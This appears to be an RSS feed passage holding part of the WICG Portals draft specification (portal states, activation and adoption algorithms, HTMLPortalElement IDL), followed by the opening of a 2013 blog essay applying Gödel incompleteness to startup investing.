  A <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/browsers.html#nested-browsing-context" id="ref-for-nested-browsing-context">nested browsing context</a> always has the <a data-link-type="dfn" href="#portal-state" id="ref-for-portal-state">portal state</a> "<code>none</code>".</p>
    <div role="note"><p>
      Briefly, these correspond to: 
     </p><ul>
      <li data-md="">
       <p>"<code>portal</code>": top-level browsing contexts embedded in a <code><a data-link-type="element" href="#elementdef-portal" id="ref-for-elementdef-portal">portal</a></code> element</p>
      </li><li data-md="">
       <p>"<code>orphaned</code>": top-level browsing contexts which have run <code><a data-link-type="idl" href="#dom-htmlportalelement-activate" id="ref-for-dom-htmlportalelement-activate">activate</a></code> but have not (yet) been <a data-link-type="dfn" href="#adopt-the-predecessor-browsing-context" id="ref-for-adopt-the-predecessor-browsing-context">adopted</a></p>
      </li><li data-md="">
       <p>"<code>none</code>": all other browsing contexts</p>
     </li></ul>
     <p><img alt="Diagram of portal state transitions" src="https://wicg.github.io/portals/portals-state-transitions.svg" width="100%"></p>
     <p>A top-level "<code>none</code>" context can become "<code>orphaned</code>" by <a data-link-type="dfn" href="#activate-a-portal-browsing-context" id="ref-for-activate-a-portal-browsing-context">activating</a> another context. An "<code>orphaned</code>" context can be <a data-link-type="dfn" href="#adopt-the-predecessor-browsing-context" id="ref-for-adopt-the-predecessor-browsing-context①">adopted</a> to
    become a "<code>portal</code>" context. A "<code>portal</code>" context can become a "<code>none</code>" context by being <a data-link-type="dfn" href="#activate-a-portal-browsing-context" id="ref-for-activate-a-portal-browsing-context①">activated</a> by its <a data-link-type="dfn" href="#host-browsing-context" id="ref-for-host-browsing-context">host browsing context</a>.</p>
     <p>A browsing context can be <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/window-object.html#close-a-browsing-context" id="ref-for-close-a-browsing-context">closed</a> while in any of these states.</p>
    </div>
    <p>A <dfn data-dfn-type="dfn" data-noexport="" id="portal-browsing-context">portal browsing context</dfn> is a <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/browsers.html#browsing-context" id="ref-for-browsing-context①">browsing context</a> whose <a data-link-type="dfn" href="#portal-state" id="ref-for-portal-state①">portal state</a> is "<code>portal</code>".</p>
    <p>The <dfn data-dfn-type="dfn" data-noexport="" id="host-element">host element</dfn> of a <a data-link-type="dfn" href="#portal-browsing-context" id="ref-for-portal-browsing-context">portal browsing context</a> is a <code><a data-link-type="element" href="#elementdef-portal" id="ref-for-elementdef-portal①">portal</a></code> element which embeds its rendered output and receives messages sent from the
  portal browsing context.</p>
    
    <p>The <dfn data-dfn-type="dfn" data-noexport="" id="host-browsing-context">host browsing context</dfn> of a <a data-link-type="dfn" href="#portal-browsing-context" id="ref-for-portal-browsing-context①">portal browsing context</a> is its <a data-link-type="dfn" href="#host-element" id="ref-for-host-element①">host element</a>'s <a data-link-type="dfn" href="https://dom.spec.whatwg.org/#concept-node-document" id="ref-for-concept-node-document">node document</a>'s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/browsers.html#browsing-context" id="ref-for-browsing-context②">browsing context</a>.</p>
    <p>The <dfn data-dfn-type="dfn" data-noexport="" id="portal-task-source">portal task source</dfn> is a <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#task-source" id="ref-for-task-source">task source</a> used for tasks related to the
  portal lifecycle and communication between a <a data-link-type="dfn" href="#portal-browsing-context" id="ref-for-portal-browsing-context②">portal browsing context</a> and its <a data-link-type="dfn" href="#host-browsing-context" id="ref-for-host-browsing-context①">host browsing context</a>.</p>
    <section data-algorithm="portal-browsing-context-activate">
      To <dfn data-dfn-type="dfn" data-noexport="" id="activate-a-portal-browsing-context">activate a portal browsing context</dfn> <var>successorBrowsingContext</var> in
    place of <var>predecessorBrowsingContext</var> with <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/origin.html#concept-origin" id="ref-for-concept-origin">origin</a> <var>sourceOrigin</var>, data <var>serializeWithTransferResult</var>, and promise <var>promise</var>, run the following steps <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/infrastructure.html#in-parallel" id="ref-for-in-parallel">in parallel</a>: 
     <ol>
      <li data-md="">
       <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#assert" id="ref-for-assert">Assert</a>: The <a data-link-type="dfn" href="#portal-state" id="ref-for-portal-state②">portal state</a> of <var>predecessorBrowsingContext</var> is "<code>none</code>".</p>
      </li><li data-md="">
       <p>Set the <a data-link-type="dfn" href="#host-element" id="ref-for-host-element②">host element</a> of <var>successorBrowsingContext</var> to null.</p>
       <p>User agents <em>should</em>, however, attempt to preserve the rendering of the
guest browsing context until <var>predecessorBrowsingContext</var> has been replaced
with <var>successorBrowsingContext</var> in the rendering.</p>
       <p role="note"><span>Note:</span> This is intended to avoid a visual glitch, such as a "white flash", where
the guest browsing context briefly disappears.</p>
      </li><li data-md="">
       <p>Set the <a data-link-type="dfn" href="#portal-state" id="ref-for-portal-state③">portal state</a> of <var>predecessorBrowsingContext</var> to "<code>orphaned</code>".</p>
      </li><li data-md="">
       <p>Update the user interface to replace <var>predecessorBrowsingContext</var> with <var>successorBrowsingContext</var> (e.g., by updating the tab/window contents and browser chrome).</p>
      </li><li data-md="">
       <p>Let <var>successorWindow</var> be <var>successorBrowsingContext</var>’s associated <code><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/window-object.html#windowproxy" id="ref-for-windowproxy">WindowProxy</a></code>'s [[Window]] internal slot value.</p>
      </li><li data-md="">
       <p><a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#queue-a-global-task" id="ref-for-queue-a-global-task">Queue a global task</a> on the <a data-link-type="dfn" href="#portal-task-source" id="ref-for-portal-task-source">portal task source</a> given <var>successorWindow</var> to run the
following steps:</p>
       <ol>
        <li data-md="">
         <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#assert" id="ref-for-assert①">Assert</a>: The <a data-link-type="dfn" href="#portal-state" id="ref-for-portal-state④">portal state</a> of <var>successorBrowsingContext</var> is "<code>portal</code>".</p>
        </li><li data-md="">
         <p>Set the <a data-link-type="dfn" href="#portal-state" id="ref-for-portal-state⑤">portal state</a> of <var>successorBrowsingContext</var> to "<code>none</code>".</p>
        </li><li data-md="">
         <p>Let <var>targetRealm</var> be <var>successorWindow</var>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-global-object-realm" id="ref-for-concept-global-object-realm">realm</a>.</p>
        </li><li data-md="">
         <p>Let <var>dataClone</var> be null.</p>
        </li><li data-md="">
         <p>If <var>successorBrowsingContext</var>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/browsers.html#active-document" id="ref-for-active-document">active document</a>'s <a data-link-type="dfn" href="https://dom.spec.whatwg.org/#concept-document-origin" id="ref-for-concept-document-origin">origin</a> is <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/origin.html#same-origin" id="ref-for-same-origin">same origin</a> with <var>sourceOrigin</var>, then:</p>
         <ol>
          <li data-md="">
           <p>Let <var>deserializeRecord</var> be <a data-link-type="abstract-op" href="https://html.spec.whatwg.org/multipage/structured-data.html#structureddeserializewithtransfer" id="ref-for-structureddeserializewithtransfer">StructuredDeserializeWithTransfer</a>(<var>serializeWithTransferResult</var>, <var>targetRealm</var>),
and set <var>dataClone</var> to <var>deserializeRecord</var>.[[Deserialized]].</p>
           <p>If this throws an exception, catch it and do nothing.</p>
         </li></ol>
        </li><li data-md="">
         <p>Let <var>event</var> be the result of <a data-link-type="dfn" href="https://dom.spec.whatwg.org/#concept-event-create" id="ref-for-concept-event-create">creating an event</a> using <code><a data-link-type="idl" href="#portalactivateevent" id="ref-for-portalactivateevent">PortalActivateEvent</a></code> and <var>targetRealm</var>.</p>
        </li><li data-md="">
         <p>Initialize <var>event</var>’s <code><a data-link-type="idl" href="https://dom.spec.whatwg.org/#dom-event-type" id="ref-for-dom-event-type">type</a></code> attribute to <code><a data-link-type="event" href="#eventdef-window-portalactivate" id="ref-for-eventdef-window-portalactivate①">portalactivate</a></code>.</p>
        </li><li data-md="">
         <p>Initialize <var>event</var>’s <code><a data-link-type="idl" href="#dom-portalactivateevent-data" id="ref-for-dom-portalactivateevent-data">data</a></code> attribute to <var>dataClone</var>.</p>
        </li><li data-md="">
         <p>Set <var>event</var>’s <a data-link-type="dfn" href="#portalactivateevent-predecessor-browsing-context" id="ref-for-portalactivateevent-predecessor-browsing-context">predecessor browsing context</a> to <var>predecessorBrowsingContext</var>.</p>
        </li><li data-md="">
         <p>Set <var>event</var>’s <a data-link-type="dfn" href="#portalactivateevent-successor-window" id="ref-for-portalactivateevent-successor-window">successor window</a> to <var>successorWindow</var>.</p>
        </li><li data-md="">
         <p>Set <var>event</var>’s <a data-link-type="dfn" href="#portalactivateevent-activation-promise" id="ref-for-portalactivateevent-activation-promise">activation promise</a> to <var>promise</var>.</p>
        </li><li data-md="">
         <p><a data-link-type="dfn" href="https://dom.spec.whatwg.org/#concept-event-dispatch" id="ref-for-concept-event-dispatch">Dispatch</a> <var>event</var> to <var>successorWindow</var>.</p>
        </li><li data-md="">
         <p>Let <var>adoptedPredecessorElement</var> be <var>event</var>’s <a data-link-type="dfn" href="#portalactivateevent-adopted-predecessor-element" id="ref-for-portalactivateevent-adopted-predecessor-element">adopted predecessor element</a>.</p>
        </li><li data-md="">
         <p>If <var>adoptedPredecessorElement</var> is not null, then:</p>
         <ol>
          <li data-md="">
           <p>Set <var>adoptedPredecessorElement</var>’s <a data-link-type="dfn" href="#htmlportalelement-just-adopted-flag" id="ref-for-htmlportalelement-just-adopted-flag">just-adopted flag</a> to false.</p>
          </li><li data-md="">
           <p>If <var>adoptedPredecessorElement</var> <a data-link-type="dfn" href="#htmlportalelement-may-have-a-guest-browsing-context" id="ref-for-htmlportalelement-may-have-a-guest-browsing-context">may not have a guest browsing context</a> and
its <a data-link-type="dfn" href="#htmlportalelement-guest-browsing-context" id="ref-for-htmlportalelement-guest-browsing-context">guest browsing context</a> is not null, then <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/window-object.html#a-browsing-context-is-discarded" id="ref-for-a-browsing-context-is-discarded">discard</a> it.</p>
           <div role="note"><p>
             This unceremoniously <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/window-object.html#a-browsing-context-is-discarded" id="ref-for-a-browsing-context-is-discarded①">discards</a> the browsing context, as if the element had been removed from
  the document after previously being attached. This is
  distinct from the case where the predecessor was never
  adopted, below, which <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/window-object.html#close-a-browsing-context" id="ref-for-close-a-browsing-context①">closes</a> the
  browsing context, which dispatches the <code><a data-link-type="event" href="https://html.spec.whatwg.org/multipage/indices.html#event-unload" id="ref-for-event-unload">unload</a></code> event, somewhat similarly to if it
  had performed an ordinary navigation. 
            </p><p>Typically authors would not call <code><a data-link-type="idl" href="#dom-portalactivateevent-adoptpredecessor" id="ref-for-dom-portalactivateevent-adoptpredecessor①">adoptPredecessor()</a></code> unless they intend
  to insert it into the document before the <a data-link-type="dfn" href="#htmlportalelement-just-adopted-flag" id="ref-for-htmlportalelement-just-adopted-flag①">just-adopted flag</a> becomes false.</p>
           </div>
         </li></ol>
        </li><li data-md="">
         <p>Otherwise:</p>
         <ol>
          <li data-md="">
           <p><a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#queue-a-global-task" id="ref-for-queue-a-global-task①">Queue a global task</a> on the <a data-link-type="dfn" href="#portal-task-source" id="ref-for-portal-task-source①">portal task source</a> given <var>predecessorBrowsingContext</var>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/browsers.html#active-window" id="ref-for-active-window">active window</a> to resolve <var>promise</var> with undefined.</p>
          </li><li data-md="">
           <p><a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/window-object.html#close-a-browsing-context" id="ref-for-close-a-browsing-context②">Close</a> <var>predecessorBrowsingContext</var>.</p>
           <p>The user agent <em>should not</em> ask the user for confirmation during the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/browsing-the-web.html#prompt-to-unload-a-document" id="ref-for-prompt-to-unload-a-document">prompt to unload</a> step (and so the browsing context should be <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/window-object.html#a-browsing-context-is-discarded" id="ref-for-a-browsing-context-is-discarded②">discarded</a>).</p>
         </li></ol>
       </li></ol>
     </li></ol>
    </section>
    <ul>
     <li><a href="https://wpt.fyi/results/portals/portal-activate-event.html">portal-activate-event.html</a> <a href="http://web-platform-tests.live/portals/portal-activate-event.html" title="portals/portal-activate-event.html"><small>(live test)</small></a> <a href="https://github.com/web-platform-tests/wpt/blob/master/portals/portal-activate-event.html"><small>(source)</small></a>
     </li><li><a href="https://wpt.fyi/results/portals/portals-host-hidden-after-activation.html">portals-host-hidden-after-activation.html</a> <a href="http://web-platform-tests.live/portals/portals-host-hidden-after-activation.html" title="portals/portals-host-hidden-after-activation.html"><small>(live test)</small></a> <a href="https://github.com/web-platform-tests/wpt/blob/master/portals/portals-host-hidden-after-activation.html"><small>(source)</small></a>
    </li></ul>
    <p><a href="#issue-b49e4903"></a> In the case that structured deserialization throws, it may be useful to do something else to indicate it,
    rather than simply providing null data. </p>
    <p><a href="#issue-0d72b101"></a> We need to specify how the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/history.html#session-history" id="ref-for-session-history">session history</a> of each browsing context is
    affected by activation, and supply non-normative text that explains how
    these histories are expected to be presented to the user. </p>
    <section data-algorithm="portal-browsing-context-adopt-predecessor">
      To <dfn data-dfn-type="dfn" data-noexport="" id="adopt-the-predecessor-browsing-context">adopt the predecessor browsing context</dfn> <var>predecessorBrowsingContext</var> in <var>successorWindow</var>, run the following steps: 
     <ol>
      <li data-md="">
       <p>Let <var>document</var> be the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/window-object.html#concept-document-window" id="ref-for-concept-document-window">document</a> of <var>successorWindow</var>.</p>
      </li><li data-md="">
       <p>Let <var>portalElement</var> be the result of <a data-link-type="dfn" href="https://dom.spec.whatwg.org/#concept-create-element" id="ref-for-concept-create-element">creating an element</a> given <var>document</var>, <code>portal</code>, and the <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#html-namespace" id="ref-for-html-namespace">HTML namespace</a>.</p>
      </li><li data-md="">
       <p>Set <var>portalElement</var>’s <a data-link-type="dfn" href="#htmlportalelement-just-adopted-flag" id="ref-for-htmlportalelement-just-adopted-flag②">just-adopted flag</a> to true.</p>
      </li><li data-md="">
       <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#assert" id="ref-for-assert②">Assert</a>: <var>portalElement</var> is an <code><a data-link-type="idl" href="#htmlportalelement" id="ref-for-htmlportalelement">HTMLPortalElement</a></code>.</p>
      </li><li data-md="">
       <p><a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#queue-a-global-task" id="ref-for-queue-a-global-task②">Queue a global task</a> on the <a data-link-type="dfn" href="#portal-task-source" id="ref-for-portal-task-source②">portal task source</a> given <var>predecessorBrowsingContext</var>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/browsers.html#active-window" id="ref-for-active-window①">active window</a> to run the following steps:</p>
       <ol>
        <li data-md="">
         <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#assert" id="ref-for-assert③">Assert</a>: The <a data-link-type="dfn" href="#portal-state" id="ref-for-portal-state⑥">portal state</a> of <var>predecessorBrowsingContext</var> is "<code>orphaned</code>".</p>
        </li><li data-md="">
         <p>Set the <a data-link-type="dfn" href="#portal-state" id="ref-for-portal-state⑦">portal state</a> of <var>predecessorBrowsingContext</var> to "<code>portal</code>", and
set the <a data-link-type="dfn" href="#host-element" id="ref-for-host-element③">host element</a> of <var>predecessorBrowsingContext</var> to <var>portalElement</var>.</p>
       </li></ol>
      </li><li data-md="">
       <p>Return <var>portalElement</var>.</p>
     </li></ol>
    </section>
    <div role="note"><p>
      Since the task to set the <a data-link-type="dfn" href="#portal-state" id="ref-for-portal-state⑧">portal state</a>, and thus expose the <code><a data-link-type="idl" href="#portalhost" id="ref-for-portalhost">PortalHost</a></code> object, is queued first, and from the same <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#task-source" id="ref-for-task-source①">task source</a>,
    it is exposed at the time the <a data-link-type="dfn" href="#portalactivateevent-activation-promise" id="ref-for-portalactivateevent-activation-promise①">activation promise</a> returned from <code><a data-link-type="idl" href="#dom-htmlportalelement-activate" id="ref-for-dom-htmlportalelement-activate①">activate(options)</a></code> is resolved. 
</p><pre><c- c1="">// In the successor document.</c->
onportalactivate <c- o="">=</c-> event <c- p="">=&gt;</c-> <c- p="">{</c->
  <c- c1="">// The predecessor document is adopted into a &lt;portal&gt; element...</c->
  document<c- p="">.</c->body<c- p="">.</c->appendChild<c- p="">(</c->event<c- p="">.</c->adoptPredecessor<c- p="">());</c->
<c- p="">});</c->

<c- c1="">// In the predecessor document.</c->
portalElement<c- p="">.</c->activate<c- p="">().</c->then<c- p="">(()</c-> <c- p="">=&gt;</c-> <c- p="">{</c->
  <c- c1="">// ...and it is guaranteed to observe that change by the time the</c->
  <c- c1="">// activation promise resolves.</c->
  console<c- p="">.</c->assert<c- p="">(</c->window<c- p="">.</c->portalHost <c- k="">instanceof</c-> PortalHost<c- p="">);</c->
<c- p="">});</c->
</pre>
    </div>
   </section>
   <section>
    <h2 data-level="3" id="the-portal-element"><span>3. </span><span>The <code>portal</code> element</span><a href="#the-portal-element"></a></h2>
    <p><em>The following section would be added as a new subsection of <a data-link-type="biblio" href="#biblio-html">[HTML]</a>'s <a href="https://html.spec.whatwg.org/#embedded-content">Embedded content</a> section.</em></p>
    <p>A <dfn data-dfn-type="element" data-export="" id="elementdef-portal"><code>portal</code></dfn> element allows for a <a data-link-type="dfn" href="#portal-browsing-context" id="ref-for-portal-browsing-context③">portal browsing context</a> to be embedded in an HTML document.</p>
    <ul>
     <li><a href="https://wpt.fyi/results/portals/portals-rendering.html">portals-rendering.html</a> <a href="http://web-platform-tests.live/portals/portals-rendering.html" title="portals/portals-rendering.html"><small>(live test)</small></a> <a href="https://github.com/web-platform-tests/wpt/blob/master/portals/portals-rendering.html"><small>(source)</small></a>
    </li></ul>
    <p>A <code><a data-link-type="element" href="#elementdef-portal" id="ref-for-elementdef-portal③">portal</a></code> element <var>portalElement</var> has a <dfn data-dfn-for="HTMLPortalElement" data-dfn-type="dfn" data-lt="guest browsing context" data-noexport="" id="htmlportalelement-guest-browsing-context">guest
  browsing context</dfn>, which is the <a data-link-type="dfn" href="#portal-browsing-context" id="ref-for-portal-browsing-context④">portal browsing context</a> whose <a data-link-type="dfn" href="#host-element" id="ref-for-host-element④">host
  element</a> is <var>portalElement</var>, or null if no such browsing context exists.</p>
    <p>A <code><a data-link-type="element" href="#elementdef-portal" id="ref-for-elementdef-portal④">portal</a></code> element has a <dfn data-dfn-for="HTMLPortalElement" data-dfn-type="dfn" data-lt="just-adopted flag" data-noexport="" id="htmlportalelement-just-adopted-flag">just-adopted
  flag</dfn>, which is a <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#boolean" id="ref-for-boolean">boolean</a> and is initially false. It is set during
  dispatch of the <code><a data-link-type="event" href="#eventdef-window-portalactivate" id="ref-for-eventdef-window-portalactivate②">portalactivate</a></code> event.</p>
    <p>The <dfn data-dfn-for="portal" data-dfn-type="element-attr" data-export="" id="element-attrdef-portal-src"><code>src</code></dfn> attribute gives the <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url" id="ref-for-concept-url">URL</a> of a
  page that the <a data-link-type="dfn" href="#htmlportalelement-guest-browsing-context" id="ref-for-htmlportalelement-guest-browsing-context①">guest browsing context</a> is to contain. The attribute, if
  present, must be a <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/urls-and-fetching.html#valid-non-empty-url-potentially-surrounded-by-spaces" id="ref-for-valid-non-empty-url-potentially-surrounded-by-spaces">valid non-empty URL potentially surrounded by spaces</a>.</p>
    <p>The <dfn data-dfn-for="portal" data-dfn-type="element-attr" data-export="" id="element-attrdef-portal-referrerpolicy"><code>referrerpolicy</code></dfn> attribute is a <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/urls-and-fetching.html#referrer-policy-attribute" id="ref-for-referrer-policy-attribute">referrer policy attribute</a>.
  Its purpose is to set the <a data-link-type="dfn" href="https://w3c.github.io/webappsec-referrer-policy/#referrer-policy" id="ref-for-referrer-policy">referrer policy</a> used when <a data-link-type="dfn" href="#htmlportalelement-set-the-source-url-of-a-portal-element" id="ref-for-htmlportalelement-set-the-source-url-of-a-portal-element">setting the source URL of a portal element</a>. <a data-link-type="biblio" href="#biblio-referrer-policy">[REFERRER-POLICY]</a></p>
    <p role="note"> A <code><a data-link-type="element" href="#elementdef-portal" id="ref-for-elementdef-portal⑤">portal</a></code> is similar to an <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element" id="ref-for-the-iframe-element">iframe</a></code>, in that it allows another
    browsing context to be embedded.  However, the <a data-link-type="dfn" href="#portal-browsing-context" id="ref-for-portal-browsing-context⑤">portal browsing context</a> hosted by a <code><a data-link-type="element" href="#elementdef-portal" id="ref-for-elementdef-portal⑥">portal</a></code> is part of a separate <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/browsers.html#browsing-context-group" id="ref-for-browsing-context-group">browsing context group</a>,
    and thus a separate <a data-link-type="dfn" href="http://tc39.github.io/ecma262/#sec-agents" id="ref-for-sec-agents">agent</a>.  The user agent is therefore free to use a
    separate <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-agent-event-loop" id="ref-for-concept-agent-event-loop">event loop</a> for the browsing contexts, even if they are <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/origin.html#same-origin-domain" id="ref-for-same-origin-domain">same
    origin-domain</a>. </p>
<pre>[<a data-link-type="extended-attribute" href="https://heycam.github.io/webidl/#Exposed" id="ref-for-Exposed"><c- g="">Exposed</c-></a>=<c- n="">Window</c->, <a data-link-type="extended-attribute" href="https://html.spec.whatwg.org/multipage/dom.html#htmlconstructor" id="ref-for-htmlconstructor"><c- g="">HTMLConstructor</c-></a>]
<c- b="">interface</c-> <dfn data-dfn-type="interface" data-export="" id="htmlportalelement"><code><c- g="">HTMLPortalElement</c-></code></dfn> : <a data-link-type="idl-name" href="https://html.spec.whatwg.org/multipage/dom.html#htmlelement" id="ref-for-htmlelement"><c- n="">HTMLElement</c-></a> {
    [<a data-link-type="extended-attribute" href="https://html.spec.whatwg.org/multipage/custom-elements.html#cereactions" id="ref-for-cereactions"><c- g="">CEReactions</c-></a>] <c- b="">attribute</c-> <a data-link-type="interface" href="https://heycam.github.io/webidl/#idl-USVString" id="ref-for-idl-USVString"><c- b="">USVString</c-></a> <a data-link-type="attribute" data-type="USVString" href="#dom-htmlportalelement-src" id="ref-for-dom-htmlportalelement-src"><c- g="">src</c-></a>;
    [<a data-link-type="extended-attribute" href="https://html.spec.whatwg.org/multipage/custom-elements.html#cereactions" id="ref-for-cereactions①"><c- g="">CEReactions</c-></a>] <c- b="">attribute</c-> <a data-link-type="interface" href="https://heycam.github.io/webidl/#idl-DOMString" id="ref-for-idl-DOMString"><c- b="">DOMString</c-></a> <a data-link-type="attribute" data-type="DOMString" href="#dom-htmlportalelement-referrerpolicy" id="ref-for-dom-htmlportalelement-referrerpolicy"><c- g="">referrerPolicy</c-></a>;

    [<a data-link-type="extended-attribute" href="https://heycam.github.io/webidl/#NewObject" id="ref-for-NewObject"><c- g="">NewObject</c-></a>] <c- b="">Promise</c->&lt;<c- b="">void</c->&gt; <a data-link-type="method" href="#dom-htmlportalelement-activate" id="ref-for-dom-htmlportalelement-activate②"><c- g="">activate</c-></a>(<c- b="">optional</c-> <a data-link-type="idl-name" href="#dictdef-portalactivateoptions" id="ref-for-dictdef-portalactivateoptions"><c- n="">PortalActivateOptions</c-></a> <dfn data-dfn-for="HTMLPortalElement/activate(options), HTMLPortalElement/activate()" data-dfn-type="argument" data-export="" id="dom-htmlportalelement-activate-options-options"><code><c- g="">options</c-></code><a href="#dom-htmlportalelement-activate-options-options"></a></dfn>);
    <c- b="">void</c-> <a data-link-type="method" href="#dom-htmlportalelement-postmessage" id="ref-for-dom-htmlportalelement-postmessage"><c- g="">postMessage</c-></a>(<c- b="">any</c-> <dfn data-dfn-for="HTMLPortalElement/postMessage(message, options), HTMLPortalElement/postMessage(message)" data-dfn-type="argument" data-export="" id="dom-htmlportalelement-postmessage-message-options-message"><code><c- g="">message</c-></code><a href="#dom-htmlportalelement-postmessage-message-options-message"></a></dfn>, <c- b="">optional</c-> <a data-link-type="idl-name" href="https://html.spec.whatwg.org/multipage/web-messaging.html#postmessageoptions" id="ref-for-postmessageoptions"><c- n="">PostMessageOptions</c-></a> <dfn data-dfn-for="HTMLPortalElement/postMessage(message, options), HTMLPortalElement/postMessage(message)" data-dfn-type="argument" data-export="" id="dom-htmlportalelement-postmessage-message-options-options"><code><c- g="">options</c-></code><a href="#dom-htmlportalelement-postmessage-message-options-options"></a></dfn> = {});

    <c- b="">attribute</c-> <a data-link-type="idl-name" href="https://html.spec.whatwg.org/multipage/webappapis.html#eventhandler" id="ref-for-eventhandler"><c- n="">EventHandler</c-></a> <dfn data-dfn-for="HTMLPortalElement" data-dfn-type="attribute" data-export="" data-type="EventHandler" id="dom-htmlportalelement-onmessage"><code><c- g="">onmessage</c-></code></dfn>;
    <c- b="">attribute</c-> <a data-link-type="idl-name" href="https://html.spec.whatwg.org/multipage/webappapis.html#eventhandler" id="ref-for-eventhandler①"><c- n="">EventHandler</c-></a> <dfn data-dfn-for="HTMLPortalElement" data-dfn-type="attribute" data-export="" data-type="EventHandler" id="dom-htmlportalelement-onmessageerror"><code><c- g="">onmessageerror</c-></code></dfn>;
};

<c- b="">dictionary</c-> <dfn data-dfn-type="dictionary" data-export="" id="dictdef-portalactivateoptions"><code><c- g="">PortalActivateOptions</c-></code></dfn> : <a data-link-type="idl-name" href="https://html.spec.whatwg.org/multipage/web-messaging.html#postmessageoptions" id="ref-for-postmessageoptions①"><c- n="">PostMessageOptions</c-></a> {
    <c- b="">any</c-> <dfn data-dfn-for="PortalActivateOptions" data-dfn-type="dict-member" data-export="" data-type="any " id="dom-portalactivateoptions-data"><code><c- g="">data</c-></code></dfn>;
};
</pre>
    <p>The <dfn data-dfn-for="HTMLPortalElement" data-dfn-type="attribute" data-export="" id="dom-htmlportalelement-src"><code>src</code></dfn> IDL attribute must <a data-link-type="dfn" href="https://dom.spec.whatwg.org/#concept-reflect" id="ref-for-concept-reflect">reflect</a> the <code><a data-link-type="element-sub" href="#element-attrdef-portal-src" id="ref-for-element-attrdef-portal-src">src</a></code> content attribute.</p>
    <p>The <dfn data-dfn-for="HTMLPortalElement" data-dfn-type="attribute" data-export="" id="dom-htmlportalelement-referrerpolicy"><code>referrerPolicy</code></dfn>…</p></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://wicg.github.io/portals/">https://wicg.github.io/portals/</a></em></p>]]>
            </description>
            <link>https://wicg.github.io/portals/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23688699</guid>
            <pubDate>Tue, 30 Jun 2020 10:37:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Gödel Incompleteness for Startups (2013)]]>
            </title>
            <description>
<![CDATA[
Score 80 | Comments 38 (<a href="https://news.ycombinator.com/item?id=23687846">thread link</a>) | @samuel2
<br/>
June 30, 2020 | https://skibinsky.com/godel-incompleteness-for-startups/ | <a href="https://web.archive.org/web/*/https://skibinsky.com/godel-incompleteness-for-startups/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>Every year a few thousand startups are incubated in Silicon Valley. Few of them will succeed; the rest will decay or outright fail. Yet there always seems to be room for one more billion-dollar company. Besides appearing seemingly out of nowhere, the most radically successful startups are also the most unpredictable ones. What force seems to create these massive sources of wealth that initially look like “<a href="http://www.paulgraham.com/swan.html" target="_blank" rel="noopener noreferrer">bad ideas</a>”&nbsp;to everybody beside their founders?</p>
<p>You may be tempted to say “<a href="http://www.amazon.com/Black-Swan-Improbable-Robustness-Fragility/dp/081297381X" target="_blank" rel="noopener noreferrer">Black Swan</a>,” and you would be correct; however, beside simple acceptance of extraordinarily rare random events, there is deeper mathematical influence over a process that constantly spawns new opportunities. Understanding that influence will help any startup founder or investor to improve his business insights. To understand these concepts better we will make a long journey that will touch upon very foundations of logic and mathematics .</p>

<p>I usually find time to look at about two hundred startups every year. Referrals arrive from other investors, startup founders I mentor or via the massive firehose of demo days at YCombinator &amp; 500 Startups. As you can imagine, this creates an overwhelming supply of startups and innovative ideas to look into. Every startup presents the ultimate question: Is it worth it to invest your time and money? Or is it a waste of both? There is never enough time to dig deep enough into any single startup to understand it fully. Making an investment is not an easy or obvious decision. Yet, over the years, I started to notice certain meta-patterns common to all startups, the patterns that give a tantalizing premonitions on their chances of success or failure. The specifics of an industry or investment cycle might change, yet these patterns remain the same in every decade. I see them as two big groups of patterns: <strong><em>human</em></strong> patterns and <strong><em>mathematical</em></strong> patterns.</p>
